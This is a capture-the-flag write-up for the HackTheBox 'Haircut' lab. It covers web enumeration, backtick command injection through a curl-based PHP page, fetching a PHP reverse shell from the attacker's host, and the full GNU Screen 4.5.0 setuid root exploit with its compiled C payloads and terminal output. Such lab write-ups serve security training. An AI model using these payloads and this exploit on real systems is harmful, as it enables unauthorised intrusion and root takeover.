---
title: "HackTheBox - Haircut"
author: Nasrallah
description: ""
date: 2023-04-29 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, commandinjection, suid, gcc]
img_path: /assets/img/hackthebox/machines/haircut
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Hair](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). The box is running an nginx web server, and after some enumeration we find a page that executes curl, we used that to upload a shell and get foothold. For root we find a vulnerable suid binary that we exploit to get a root shell.

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.24
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e975c1e4b3633c93f2c618083648ce36 (RSA)
|   256 8700aba98f6f4bbafbc67a55a860b268 (ECDSA)
|_  256 b61b5ca9265cdc61b775906c88516e54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports, 22 running SSH and 80 running nginx 1.10, and it's an ubuntu machine.

## Web

Let's navigate to the web page.

![](1.png)

We found the image above, and the source code shows nothing interesting.

```html
<!DOCTYPE html>

<title> HTB Hairdresser </title>

<center> <br><br><br><br>
<img src="bounce.jpg" height="750" width="1200" alt="" />
<center>

```

### Feroxbuster

Let's run a directory/file scan and add the `php` extension.

```terminal
$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.10.24/ -o scans/ferodir.txt -n -x php        1 ⨯ 
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ http://10.10.10.24/                                                                                                              
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt                                                           
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 💾  Output File           │ scans/ferodir.txt                                                                                                                
 💲  Extensions            │ [php]                                                                                                                            
 🏁  HTTP methods          │ [GET]                                                                                                                            
 🚫  Do Not Recurse        │ true                                                                                                                             
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
───────────────────────────┴──────────────────────                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                           
──────────────────────────────────────────────────                                                                                                            
200      GET        7l       15w      144c http://10.10.10.24/                                                                                                
301      GET        7l       13w      194c http://10.10.10.24/uploads => http://10.10.10.24/uploads/                                                          
200      GET       19l       41w        0c http://10.10.10.24/exposed.php                                                                                     
[####################] - 9m    175300/175300  0s      found:3       errors:0                                                                                  
[####################] - 9m    175300/175300  300/s   http://10.10.10.24/ 
```

We found `uploads` directory and `exposed.php`.

![](2.png)

We can't see what's on the uploads page but on `exposed.php` it seems we can request web page.

I tried injection a command with `;id;` but it seems there is a filter.

![](3.png)

Next i tried the backtick \`id\` and managed to get the following.

![](4.png)

We got a way to execute command.

Before getting a reverse shell, a technique worth mentioning is reading file using `file://{file}`.

![](5.png)

With that, not only we have a command injection vulnerability, but also we can read file.

Now let's see what does `exposed.php` uses to request the pages, and for that we can submit a random option and see what happens.

![](6.png)

We can see that curl is the command being used, with that let's move to the next part.

# **Foothold**

For a reverse shell, we can upload a php reverse shell to the `uploads` directory since it's writable by our user `http://10.10.17.90/htbshell.php -o uploads.php`

![](7.png)

No we setup a listener and request our php reverse shell.

![](8.png)

# **Privilege Escalation**

After getting a foothold and upgrading the shell fully tty, I run `linpeas` and found the following.

![](9.png)

We found the suid binary `screen-4.5.0`. Since we have a version here, the binary must have a vulnerability.

```terminal
$ searchsploit screen 4.5.0
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                               | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                         | linux/local/41152.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We confirmed `screen-4.5.0` has a vulnerability with `searchsploit` and found a local privilege escalation [exploit](https://www.exploit-db.com/exploits/41154).

```terminal
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

I run the exploit but didn't work properly, so i tried doing it step by step.

First we create a file in `/tmp` called `libhax.c` with the following content:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

We compile it using this command: `gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c`

```terminal
www-data@haircut:/tmp$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                                                 
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

If you got an error about `cc1`, add `/bin` to PATH and it should work.

```terminal
www-data@haircut:/tmp$ export PATH=/bin:$PATH
www-data@haircut:/tmp$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                                                 
/tmp/libhax.c: In function 'dropshell':                                                                                                                       
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' [-Wimplicit-function-declaration]                                                        
     chmod("/tmp/rootshell", 04755);                                                                                                                          
     ^                                                                                                                              
```

Now we create the second file named `rootshell.c` also in /tmp with the following content:

```terminal
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

And we compile it with `gcc -o /tmp/rootshell /tmp/rootshell.c`

Now we change directory to `/etc/` and run the following command:

```terminal
www-data@haircut:/tmp$ cd /etc/
www-data@haircut:/etc$ umask 000
www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.                                                                      
[+] done!
```

Great! Now we run `/tmp/rootshell`.

```terminal
www-data@haircut:/etc$ /tmp/rootshell                                                                                                                         
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.                                                                      
[+] done!                                                                                                                                                     
# whoami                                                                                                                                                      
root           
```

And just like that we got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).